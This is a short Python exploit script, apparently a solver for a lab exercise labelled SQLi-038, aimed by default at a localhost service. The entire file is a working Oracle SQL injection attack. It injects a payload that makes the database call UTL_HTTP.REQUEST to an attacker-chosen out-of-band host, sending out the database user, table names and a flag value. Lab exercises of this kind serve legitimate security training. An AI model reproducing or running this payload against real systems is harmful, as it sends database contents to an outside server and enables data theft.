#!/usr/bin/env python3
"""SQLi-038: Oracle OOB HTTP via UTL_HTTP"""
import requests
import argparse
import urllib.parse

def send_oob(url, query, oob_url):
    payload = f"1 AND UTL_HTTP.REQUEST('{oob_url}/'||({query})) IS NOT NULL--"
    try:
        requests.get(url, params={"id": payload}, timeout=10)
        return True
    except:
        return True

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5038/customer")
    parser.add_argument("--oob", required=True, help="OOB HTTP URL (e.g., http://xxx.burpcollaborator.net)")
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] OOB: {args.oob}")
    
    print("\n[1] Extracting user...")
    send_oob(args.target, "SELECT user FROM dual", args.oob)
    
    print("[2] Extracting table names...")
    send_oob(args.target, "SELECT table_name FROM user_tables WHERE ROWNUM=1", args.oob)
    
    print("[3] Extracting flag...")
    send_oob(args.target, "SELECT value FROM flags WHERE name='sqli_038'", args.oob)
    
    print(f"\n[*] Check HTTP requests to: {args.oob}")
    print("[*] Expected: FLAG{oracle_utl_http_oob}")

if __name__ == "__main__":
    main()
